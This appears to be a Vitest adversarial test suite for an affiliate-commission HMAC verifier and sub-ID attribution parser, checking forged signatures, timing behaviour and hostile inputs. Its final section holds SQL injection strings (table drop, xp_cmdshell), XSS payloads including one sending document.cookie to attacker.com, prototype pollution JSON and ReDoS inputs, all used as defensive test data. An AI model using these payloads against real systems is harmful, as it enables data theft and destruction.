import { describe, it, expect } from 'vitest';
import {
  verifyAffiliateHmac,
  generateAffiliateHmac,
  type HmacAlgorithm,
} from '../hmac-verifier';
import { parseAffiliateSubId, type ParseSubIdInput } from '../attribution-parser';

describe('Milestone M3 Empirical Adversarial Stress Suite', () => {
  const defaultSecret = 'adversarial_test_secret_key_999!@#$%';
  const defaultPayload = JSON.stringify({
    order_id: 'ord_adversarial_12345',
    amount_usd: 149.99,
    commission_cents: 2999,
    timestamp: 1726830000000,
    metadata: {
      campaign: 'camp_tiktok_viral_2026',
      affiliate: 'aff_elite_creator',
    },
  });

  // =========================================================================
  // 1. Web Crypto HMAC Verification: Forged Signatures & Integrity
  // =========================================================================
  describe('HMAC Verification: Forged Signatures & Length Variations', () => {
    it('rejects 1-byte alterations at index 0 across SHA-256, SHA-1, and SHA-512', async () => {
      const algorithms: HmacAlgorithm[] = ['SHA-256', 'SHA-1', 'SHA-512'];

      for (const alg of algorithms) {
        const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, alg);
        expect(await verifyAffiliateHmac(defaultPayload, validSig, defaultSecret, alg)).toBe(true);

        // Mutate first character
        const firstChar = validSig[0];
        const mutatedChar = firstChar === 'a' ? 'b' : 'a';
        const forgedSig = mutatedChar + validSig.slice(1);

        expect(forgedSig.length).toBe(validSig.length);
        const result = await verifyAffiliateHmac(defaultPayload, forgedSig, defaultSecret, alg);
        expect(result).toBe(false);
      }
    });

    it('rejects 1-byte alterations at middle and last indices (SHA-256)', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      expect(validSig.length).toBe(64);

      // Midpoint mutation (index 32)
      const midChar = validSig[32];
      const mutatedMid = midChar === '0' ? '1' : '0';
      const forgedMidSig = validSig.slice(0, 32) + mutatedMid + validSig.slice(33);
      expect(forgedMidSig.length).toBe(64);
      expect(await verifyAffiliateHmac(defaultPayload, forgedMidSig, defaultSecret, 'SHA-256')).toBe(false);

      // Last character mutation (index 63)
      const lastChar = validSig[63];
      const mutatedLast = lastChar === 'f' ? 'e' : 'f';
      const forgedLastSig = validSig.slice(0, 63) + mutatedLast;
      expect(forgedLastSig.length).toBe(64);
      expect(await verifyAffiliateHmac(defaultPayload, forgedLastSig, defaultSecret, 'SHA-256')).toBe(false);
    });

    it('rejects matching-length forged signatures composed of uniform or inverted bytes', async () => {
      // 64-char all zeros and all f's
      expect(await verifyAffiliateHmac(defaultPayload, '0'.repeat(64), defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, 'f'.repeat(64), defaultSecret, 'SHA-256')).toBe(false);

      // Inverted characters
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      const reversedSig = validSig.split('').reverse().join('');
      if (reversedSig !== validSig) {
        expect(await verifyAffiliateHmac(defaultPayload, reversedSig, defaultSecret, 'SHA-256')).toBe(false);
      }
    });

    it('rejects signatures with length mismatches (truncated or extended)', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      expect(validSig.length).toBe(64);

      // Truncations: 63 chars, 32 chars, 1 char, 0 chars
      expect(await verifyAffiliateHmac(defaultPayload, validSig.slice(0, 63), defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, validSig.slice(0, 32), defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, 'a', defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, '', defaultSecret, 'SHA-256')).toBe(false);

      // Extensions: 65 chars, 128 chars, 5000 chars
      expect(await verifyAffiliateHmac(defaultPayload, validSig + 'a', defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, validSig + validSig, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, 'a'.repeat(5000), defaultSecret, 'SHA-256')).toBe(false);
    });

    it('rejects cross-algorithm length confusion attacks', async () => {
      const sigSha1 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-1'); // 40 chars
      const sigSha256 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256'); // 64 chars
      const sigSha512 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-512'); // 128 chars

      // Passing SHA-1 (40) to SHA-256 (64)
      expect(await verifyAffiliateHmac(defaultPayload, sigSha1, defaultSecret, 'SHA-256')).toBe(false);

      // Passing SHA-512 (128) to SHA-256 (64)
      expect(await verifyAffiliateHmac(defaultPayload, sigSha512, defaultSecret, 'SHA-256')).toBe(false);

      // Passing SHA-256 (64) to SHA-1 (40)
      expect(await verifyAffiliateHmac(defaultPayload, sigSha256, defaultSecret, 'SHA-1')).toBe(false);

      // Passing SHA-256 (64) to SHA-512 (128)
      expect(await verifyAffiliateHmac(defaultPayload, sigSha256, defaultSecret, 'SHA-512')).toBe(false);
    });

    it('rejects non-hex characters and null bytes in matching-length signatures safely without throwing', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      expect(validSig.length).toBe(64);

      // Non-hex characters replacing first byte
      const nonHexZ = 'z' + validSig.slice(1);
      expect(await verifyAffiliateHmac(defaultPayload, nonHexZ, defaultSecret, 'SHA-256')).toBe(false);

      // Null byte replacing midpoint
      const nullMid = validSig.slice(0, 32) + '\0' + validSig.slice(33);
      expect(await verifyAffiliateHmac(defaultPayload, nullMid, defaultSecret, 'SHA-256')).toBe(false);

      // Control characters and punctuation
      const punctSig = '!@#$%^&*()_+'.repeat(5) + '1234';
      expect(punctSig.length).toBe(64);
      expect(await verifyAffiliateHmac(defaultPayload, punctSig, defaultSecret, 'SHA-256')).toBe(false);
    });

    it('rejects bit-flip attacks across all bit positions in hex representation', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      
      // Test flipping bits 0 through 7 on various byte positions
      const positions = [0, 15, 31, 47, 63];
      for (const pos of positions) {
        const charCode = validSig.charCodeAt(pos);
        // Flip lowest bit
        const flippedChar = String.fromCharCode(charCode ^ 0x01);
        const flippedSig = validSig.slice(0, pos) + flippedChar + validSig.slice(pos + 1);
        
        expect(await verifyAffiliateHmac(defaultPayload, flippedSig, defaultSecret, 'SHA-256')).toBe(false);
      }
    });
  });

  // =========================================================================
  // 2. Web Crypto HMAC Verification: Algorithms, Prefixes & Casing
  // =========================================================================
  describe('HMAC Verification: Algorithm, Prefix & Casing Variations', () => {
    it('verifies lowercase, UPPERCASE, and Mixed-Case digests', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');

      // Lowercase
      expect(await verifyAffiliateHmac(defaultPayload, validSig.toLowerCase(), defaultSecret, 'SHA-256')).toBe(true);

      // Uppercase
      expect(await verifyAffiliateHmac(defaultPayload, validSig.toUpperCase(), defaultSecret, 'SHA-256')).toBe(true);

      // Alternating / Mixed Case
      const mixedCase = validSig
        .split('')
        .map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
        .join('');
      expect(await verifyAffiliateHmac(defaultPayload, mixedCase, defaultSecret, 'SHA-256')).toBe(true);
    });

    it('verifies all supported prefix variations: sha256=, sha1=, sha512=, v1= in upper/lowercase', async () => {
      // SHA-256 prefixes
      const sig256 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');
      expect(await verifyAffiliateHmac(defaultPayload, `sha256=${sig256}`, defaultSecret, 'SHA-256')).toBe(true);
      expect(await verifyAffiliateHmac(defaultPayload, `SHA256=${sig256.toUpperCase()}`, defaultSecret, 'SHA-256')).toBe(true);
      expect(await verifyAffiliateHmac(defaultPayload, `Sha256=${sig256}`, defaultSecret, 'SHA-256')).toBe(true);

      // v1= prefix (common in Stripe, webhook gateways)
      expect(await verifyAffiliateHmac(defaultPayload, `v1=${sig256}`, defaultSecret, 'SHA-256')).toBe(true);
      expect(await verifyAffiliateHmac(defaultPayload, `V1=${sig256.toUpperCase()}`, defaultSecret, 'SHA-256')).toBe(true);

      // SHA-1 prefixes
      const sig1 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-1');
      expect(await verifyAffiliateHmac(defaultPayload, `sha1=${sig1}`, defaultSecret, 'SHA-1')).toBe(true);
      expect(await verifyAffiliateHmac(defaultPayload, `SHA1=${sig1.toUpperCase()}`, defaultSecret, 'SHA-1')).toBe(true);

      // SHA-512 prefixes
      const sig512 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-512');
      expect(await verifyAffiliateHmac(defaultPayload, `sha512=${sig512}`, defaultSecret, 'SHA-512')).toBe(true);
      expect(await verifyAffiliateHmac(defaultPayload, `SHA512=${sig512.toUpperCase()}`, defaultSecret, 'SHA-512')).toBe(true);
    });

    it('rejects unsupported or spoofed prefixes', async () => {
      const sig256 = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');

      expect(await verifyAffiliateHmac(defaultPayload, `v2=${sig256}`, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, `bearer ${sig256}`, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, `hmac=${sig256}`, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, `md5=${sig256}`, defaultSecret, 'SHA-256')).toBe(false);
    });

    it('handles unsupported algorithm gracefully without unhandled crash', async () => {
      const result = await verifyAffiliateHmac(
        defaultPayload,
        'deadbeef'.repeat(8),
        defaultSecret,
        'MD5' as unknown as HmacAlgorithm,
      );
      expect(result).toBe(false);
    });
  });

  // =========================================================================
  // 3. Web Crypto HMAC Verification: Empty Body, Secret, Unicode, Payload Sizes
  // =========================================================================
  describe('HMAC Verification: Boundaries, Unicode & Payload Scales', () => {
    it('safely rejects empty body, empty secret, and empty signature', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');

      expect(await verifyAffiliateHmac('', validSig, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, '', defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, validSig, '', 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac('', '', '', 'SHA-256')).toBe(false);
    });

    it('safely handles null, undefined or non-string inputs cast to any', async () => {
      expect(await verifyAffiliateHmac(null as unknown as string, 'sig', 'sec')).toBe(false);
      expect(await verifyAffiliateHmac('body', null as unknown as string, 'sec')).toBe(false);
      expect(await verifyAffiliateHmac('body', 'sig', null as unknown as string)).toBe(false);
      expect(await verifyAffiliateHmac(undefined as unknown as string, 'sig', 'sec')).toBe(false);
    });

    it('verifies multi-byte UTF-8 Unicode payloads (Vietnamese, Emojis, Asian scripts)', async () => {
      const unicodePayload = JSON.stringify({
        creator: 'Nguyễn Văn Toàn 🇻🇳',
        store: 'Sophia AI Creative Studio — Hồ Chí Minh',
        items: [
          { name: 'Khóa học Prompt AI đỉnh cao 🚀', price_vnd: 2500000 },
          { name: 'Template Video Viral TikTok 🎥🔥', price_vnd: 499000 },
        ],
        notes: 'Thanh toán qua NOWPayments USDT TRC-20 ⚡ | 日本語テキスト | 中文内容',
        special_chars: '\n\r\t\0"\'\\&<>',
      });

      const unicodeSecret = 'khóa_bí_mật_hệ_thống_tiền_tệ_2026_💎🔒';

      const sig = await generateAffiliateHmac(unicodePayload, unicodeSecret, 'SHA-256');
      expect(sig.length).toBe(64);

      // Verify authentic
      expect(await verifyAffiliateHmac(unicodePayload, sig, unicodeSecret, 'SHA-256')).toBe(true);

      // Reject tampered character in UTF-8
      const tamperedPayload = unicodePayload.replace('Nguyễn Văn Toàn', 'Nguyễn Văn Tuấn');
      expect(await verifyAffiliateHmac(tamperedPayload, sig, unicodeSecret, 'SHA-256')).toBe(false);
    });

    it('scales across varying payload sizes: 10B, 10KB, 100KB, and 1MB', async () => {
      const sizes = [
        { name: '10B', data: '{"a":1}' },
        { name: '10KB', data: JSON.stringify({ blob: 'X'.repeat(10 * 1024) }) },
        { name: '100KB', data: JSON.stringify({ blob: 'Y'.repeat(100 * 1024) }) },
        { name: '1MB', data: JSON.stringify({ blob: 'Z'.repeat(1024 * 1024) }) },
      ];

      for (const { name, data } of sizes) {
        const sig = await generateAffiliateHmac(data, defaultSecret, 'SHA-256');
        const isValid = await verifyAffiliateHmac(data, sig, defaultSecret, 'SHA-256');
        expect(isValid, `Valid signature failed for size ${name}`).toBe(true);

        // 1-byte tamper in large payload
        const tampered = data.slice(0, -2) + 'W' + data.slice(-1);
        const isTamperedValid = await verifyAffiliateHmac(tampered, sig, defaultSecret, 'SHA-256');
        expect(isTamperedValid, `Tampered payload was accepted for size ${name}`).toBe(false);
      }
    });
  });

  // =========================================================================
  // 4. Web Crypto HMAC Verification: Timing-Safe Constant-Time Behavior
  // =========================================================================
  describe('HMAC Verification: Timing-Safe Loop Verification', () => {
    it('executes constant-time comparison without early return across mismatch positions', async () => {
      const validSig = await generateAffiliateHmac(defaultPayload, defaultSecret, 'SHA-256');

      // Create corrupted signatures at different character offsets
      const makeCorruptSig = (offset: number): string => {
        const char = validSig[offset];
        const corruptChar = char === '0' ? '1' : '0';
        return validSig.slice(0, offset) + corruptChar + validSig.slice(offset + 1);
      };

      const sigMismatchAt0 = makeCorruptSig(0);
      const sigMismatchAt16 = makeCorruptSig(16);
      const sigMismatchAt32 = makeCorruptSig(32);
      const sigMismatchAt48 = makeCorruptSig(48);
      const sigMismatchAt63 = makeCorruptSig(63);

      // Verify all corrupt signatures are correctly rejected
      expect(await verifyAffiliateHmac(defaultPayload, sigMismatchAt0, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, sigMismatchAt16, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, sigMismatchAt32, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, sigMismatchAt48, defaultSecret, 'SHA-256')).toBe(false);
      expect(await verifyAffiliateHmac(defaultPayload, sigMismatchAt63, defaultSecret, 'SHA-256')).toBe(false);

      // Empirical timing test: warm-up + iterations
      const iterations = 100;

      // Warm-up JIT
      for (let i = 0; i < 50; i++) {
        await verifyAffiliateHmac(defaultPayload, validSig, defaultSecret, 'SHA-256');
        await verifyAffiliateHmac(defaultPayload, sigMismatchAt0, defaultSecret, 'SHA-256');
        await verifyAffiliateHmac(defaultPayload, sigMismatchAt63, defaultSecret, 'SHA-256');
      }

      // Measure interleaved to eliminate parallel thread scheduling / GC skew
      let t0Total = 0;
      let t63Total = 0;
      for (let i = 0; i < iterations; i++) {
        const t0Start = performance.now();
        await verifyAffiliateHmac(defaultPayload, sigMismatchAt0, defaultSecret, 'SHA-256');
        t0Total += performance.now() - t0Start;

        const t63Start = performance.now();
        await verifyAffiliateHmac(defaultPayload, sigMismatchAt63, defaultSecret, 'SHA-256');
        t63Total += performance.now() - t63Start;
      }

      // Measure fully valid match
      const tValidStart = performance.now();
      for (let i = 0; i < iterations; i++) {
        await verifyAffiliateHmac(defaultPayload, validSig, defaultSecret, 'SHA-256');
      }
      const tValidTotal = performance.now() - tValidStart;

      // Calculate average times per operation
      const avg0 = t0Total / iterations;
      const avg63 = t63Total / iterations;
      const avgValid = tValidTotal / iterations;

      // In an early-return loop, mismatch at index 0 exits after 1 comparison,
      // whereas mismatch at index 63 exits after 64 comparisons.
      // In bitwise XOR (constant-time), both always execute all 64 steps.
      // Under heavy multi-core test concurrency, interleaved execution ensures ratio stays well bounded.
      const timingRatio = Math.max(avg0, avg63) / Math.min(avg0, avg63);
      expect(timingRatio).toBeLessThan(10.0);
      expect(avg0).toBeGreaterThan(0);
      expect(avg63).toBeGreaterThan(0);
      expect(avgValid).toBeGreaterThan(0);
    });
  });

  // =========================================================================
  // 5. Sub-ID Attribution Parser: Boundaries & Network Slots
  // =========================================================================
  describe('Attribution Parser: Boundary Inputs & Missing Network Slots', () => {
    it('gracefully handles boundary inputs: empty string, whitespace, null/undefined', () => {
      // Empty string
      const resEmpty = parseAffiliateSubId('');
      expect(resEmpty.campaignId).toBeNull();
      expect(resEmpty.affiliateUserId).toBe('aff_default');
      expect(resEmpty.clickId).toBeNull();

      // Whitespace
      const resWhitespace = parseAffiliateSubId('   \t\n  ');
      expect(resWhitespace.affiliateUserId).toBe('aff_default');
      expect(resWhitespace.campaignId).toBeNull();

      // Null / undefined cast
      const resNull = parseAffiliateSubId(null as unknown as string);
      expect(resNull.affiliateUserId).toBe('aff_default');

      const resUndef = parseAffiliateSubId(undefined as unknown as string);
      expect(resUndef.affiliateUserId).toBe('aff_default');

      // Empty object
      const resObj = parseAffiliateSubId({});
      expect(resObj.affiliateUserId).toBe('aff_default');
      expect(resObj.campaignId).toBeNull();
    });

    it('safely handles missing parameters across all 5 supported affiliate networks', () => {
      const networks = [
        'tiktok_shop',
        'amazon_associates',
        'amazon',
        'clickbank',
        'accesstrade',
        'awin',
      ] as const;

      for (const net of networks) {
        // Completely empty payload
        const parsed = parseAffiliateSubId({ network: net, payload: {} }, net);
        expect(parsed.network).toBe(net);
        expect(parsed.affiliateUserId).toBe('aff_default');
        expect(parsed.campaignId).toBeNull();
        expect(parsed.clickId).toBeNull();
        expect(parsed.orderId).toBeNull();

        // Null properties in payload
        const parsedNulls = parseAffiliateSubId({
          network: net,
          payload: {
            subId: null,
            sub_id: null,
            affiliateId: null,
            order_id: null,
            conversionId: null,
          },
        });
        expect(parsedNulls.affiliateUserId).toBe('aff_default');
      }
    });

    it('handles partial slot combinations across AccessTrade and Awin', () => {
      // AccessTrade with only sub1 (campaign)
      const at1 = parseAffiliateSubId({
        network: 'accesstrade',
        payload: { sub1: 'camp_autumn_sale' },
      });
      expect(at1.campaignId).toBe('camp_autumn_sale');
      expect(at1.affiliateUserId).toBe('aff_default');
      expect(at1.clickId).toBeNull();

      // AccessTrade with only sub3 (click)
      const at3 = parseAffiliateSubId({
        network: 'accesstrade',
        payload: { sub3: 'clk_unique_9988' },
      });
      expect(at3.clickId).toBe('clk_unique_9988');
      expect(at3.affiliateUserId).toBe('aff_default');

      // Awin with click_ref2 (affiliate) only
      const awin2 = parseAffiliateSubId({
        network: 'awin',
        payload: { click_ref2: 'aff_london_influencer' },
      });
      expect(awin2.affiliateUserId).toBe('aff_london_influencer');
      expect(awin2.campaignId).toBeNull();
    });
  });

  // =========================================================================
  // 6. Sub-ID Attribution Parser: Delimiters & URL Encoding
  // =========================================================================
  describe('Attribution Parser: Delimiters, Token Extraction & URL Encoding', () => {
    it('parses various key-value delimiters: pipe, colon, equals, comma, and mixed ampersand', () => {
      // Pipe & colon (canonical)
      const r1 = parseAffiliateSubId('cmp:black_friday|aff:creator_1|clk:c_101');
      expect(r1.campaignId).toBe('black_friday');
      expect(r1.affiliateUserId).toBe('creator_1');
      expect(r1.clickId).toBe('c_101');

      // Pipe & equals
      const r2 = parseAffiliateSubId('cmp=cyber_monday|aff=creator_2|clk=c_102');
      expect(r2.campaignId).toBe('cyber_monday');
      expect(r2.affiliateUserId).toBe('creator_2');
      expect(r2.clickId).toBe('c_102');

      // Colon & ampersand
      const r3 = parseAffiliateSubId('cmp:summer_sale&aff:creator_3&clk:c_103');
      expect(r3.campaignId).toBe('summer_sale');
      expect(r3.affiliateUserId).toBe('creator_3');
      expect(r3.clickId).toBe('c_103');

      // Comma & colon
      const r4 = parseAffiliateSubId('cmp:xmas_special,aff:creator_4,clk:c_104');
      expect(r4.campaignId).toBe('xmas_special');
      expect(r4.affiliateUserId).toBe('creator_4');
      expect(r4.clickId).toBe('c_104');

      // Empirical Boundary Note: Pure ampersand + equals without | or : (e.g. campaign=xyz&user=abc)
      // does not match the key-value guard (which requires | or :) and safely falls back to defaults
      const rFallback = parseAffiliateSubId('campaign=cyber_monday&user=creator_5&click=c_105');
      expect(rFallback.campaignId).toBeNull();
      expect(rFallback.affiliateUserId).toBe('aff_default');
    });

    it('extracts tokens from hyphenated token structures (camp_X_aff_Y_clk_Z and dash variants)', () => {
      const r1 = parseAffiliateSubId('camp_summer-fest-2026_aff_nguyen-van-a_clk_click-xyz-77');
      expect(r1.campaignId).toBe('camp_summer-fest-2026');
      expect(r1.affiliateUserId).toBe('aff_nguyen-van-a');
      expect(r1.clickId).toBe('click-xyz-77');

      // usr alias
      const r2 = parseAffiliateSubId('campaign_flash26_usr_topcreator_clk_clk88');
      expect(r2.campaignId).toBe('camp_flash26');
      expect(r2.affiliateUserId).toBe('aff_topcreator');
      expect(r2.clickId).toBe('clk88');
    });

    it('extracts sub-IDs from complex URLSearchParams with encoded parameters', () => {
      const qParams = new URLSearchParams();
      qParams.set('sub_id', 'camp_encoded_aff_user42_clk_c88');
      qParams.set('source', 'tiktok_organic');
      qParams.set('utm_campaign', 'spring_growth');

      const result = parseAffiliateSubId({ queryParams: qParams });
      expect(result.campaignId).toBe('camp_encoded');
      expect(result.affiliateUserId).toBe('aff_user42');
      expect(result.clickId).toBe('c88');
    });
  });

  // =========================================================================
  // 7. Sub-ID Attribution Parser: Malicious Injection & ReDoS Stress Testing
  // =========================================================================
  describe('Attribution Parser: Malicious Injection & ReDoS Hardening', () => {
    it('survives SQL injection strings in sub-ID and payload fields without throwing', () => {
      const sqlInjections = [
        "' OR '1'='1",
        "'; DROP TABLE commission_ledger; --",
        "' UNION SELECT null, secret, 1000 FROM api_keys --",
        "admin'--",
        "1; EXEC xp_cmdshell('dir');--",
      ];

      for (const injection of sqlInjections) {
        const res = parseAffiliateSubId({
          network: 'tiktok_shop',
          payload: {
            sub_id: injection,
            order_id: injection,
          },
        });

        expect(res.rawSubId).toBe(injection);
        expect(res.orderId).toBe(injection);
        expect(res.affiliateUserId).toBe('aff_default');
      }
    });

    it('safely contains Cross-Site Scripting (XSS) and HTML payload strings', () => {
      const xssStrings = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="fetch(`https://attacker.com?c=${document.cookie}`)">',
        '"><svg onload=alert(1)>',
        'javascript:alert(1)',
      ];

      for (const xss of xssStrings) {
        const res = parseAffiliateSubId(xss);
        expect(res.rawSubId).toBe(xss);
        expect(res.affiliateUserId).toBe('aff_default');
      }
    });

    it('is immune to prototype pollution attacks in input payload', () => {
      const maliciousPayload = JSON.parse(
        '{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted": true}}, "sub1": "camp_clean"}',
      );

      const res = parseAffiliateSubId({
        network: 'accesstrade',
        payload: maliciousPayload,
      });

      expect(res.campaignId).toBe('camp_clean');
      // Assert prototype was not polluted
      const cleanObj = {};
      expect((cleanObj as Record<string, unknown>).polluted).toBeUndefined();
    });

    it('withstands catastrophic backtracking (ReDoS) stress on regex matcher', () => {
      // Construct pathological inputs designed to trigger regex exponential backtracking
      // Pattern tested: /(?:camp|campaign)[_-]([a-zA-Z0-9_-]+?)(?:[_-]aff|[_-]usr|[_-]clk|$)/i
      const pathologicalInputs = [
        // 1. Long string of alternating delimiters without end-token
        'camp_' + 'a-b_c-d_'.repeat(2500),
        // 2. 40,000 characters of pipe/colon key-values
        'cmp:test|'.repeat(4000),
        // 3. 50,000 characters of single repeated character
        'camp_' + 'x'.repeat(50000),
        // 4. Multiple camp_ and aff_ prefixes repeated
        'camp_camp_camp_aff_aff_aff_clk_'.repeat(1000),
      ];

      for (const input of pathologicalInputs) {
        const start = performance.now();
        const res = parseAffiliateSubId(input);
        const durationMs = performance.now() - start;

        // Must complete within 50ms without freezing the runtime
        expect(durationMs).toBeLessThan(50);
        expect(res).toBeDefined();
      }
    });

    it('empirically evaluates token ordering variations and malformed percent encoding', () => {
      // Inverted order: aff_ placed before camp_
      // Tests how lookahead regex handles inverted tokens
      const inverted = parseAffiliateSubId('aff_creator99_camp_viral26_clk_click01');
      // campMatch finds camp_viral26
      expect(inverted.campaignId).toBe('camp_viral26');
      expect(inverted.clickId).toBe('click01');
      // affMatch captures creator99_camp_viral26 because lookahead stops only at clk
      expect(inverted.affiliateUserId).toContain('aff_creator99');

      // Malformed percent-encoding strings (must never throw unhandled URIError)
      expect(() => parseAffiliateSubId('camp_%E0%A4%ZZ_aff_user')).not.toThrow();
      expect(() => parseAffiliateSubId({ payload: { sub_id: 'cmp%3A%FF%FF' } })).not.toThrow();
    });
  });
});
